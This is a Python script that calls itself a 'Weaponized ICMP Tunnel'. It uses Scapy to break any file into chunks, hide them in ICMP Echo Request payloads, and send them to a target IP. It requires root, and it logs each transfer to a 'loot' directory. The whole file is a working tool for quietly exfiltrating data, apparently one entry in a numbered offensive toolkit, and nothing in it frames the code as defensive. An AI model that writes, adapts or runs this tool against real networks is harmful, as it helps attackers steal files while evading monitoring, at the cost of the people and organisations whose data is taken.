import sys
import os
from scapy.all import IP, ICMP, send

def tunnel_icmp(target_ip, file_path, chunk_size=1024):
    """
    Weaponized ICMP Tunnel: Wraps raw file data into ICMP Echo Request 
    payloads using Scapy's raw packet crafting capabilities.
    """
    if os.geteuid() != 0:
        print("[-] ROOT REQUIRED: Raw socket access for ICMP requires UID 0.")
        sys.exit(1)

    if not os.path.exists(file_path):
        print(f"[-] File not found: {file_path}")
        return

    print(f"[*] Preparing ICMP Tunnel to: {target_ip}")
    print(f"[*] Exfiltrating: {file_path}")

    try:
        with open(file_path, 'rb') as f:
            data = f.read()

        # Chunk the data to avoid MTU fragmentation issues
        chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
        total = len(chunks)

        print(f"[*] Dispatched {total} packets...")
        print("-" * 60)

        for i, chunk in enumerate(chunks):
            # Type 8 = Echo Request. We embed data in the payload.
            packet = IP(dst=target_ip)/ICMP(type=8, id=0x1337, seq=i)/chunk
            send(packet, verbose=False)
            print(f"[+] Sent Packet {i+1}/{total} | Payload: {len(chunk)} bytes")

        print("-" * 60)
        print(f"[!] ICMP TRANSMISSION COMPLETE. Reconstruct from raw PCAP on {target_ip}")
        
        with open("../loot/icmp_exfil_history.log", "a") as log:
            log.write(f"Target: {target_ip} | File: {file_path} | Packets: {total}\n")

    except Exception as e:
        print(f"[-] Protocol Fault: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: sudo python3 137_icmp_tunnel <target_ip> <file_to_send> [chunk_size]")
        sys.exit(1)
    
    c_size = int(sys.argv[3]) if len(sys.argv) > 3 else 1024
    tunnel_icmp(sys.argv[1], sys.argv[2], c_size)
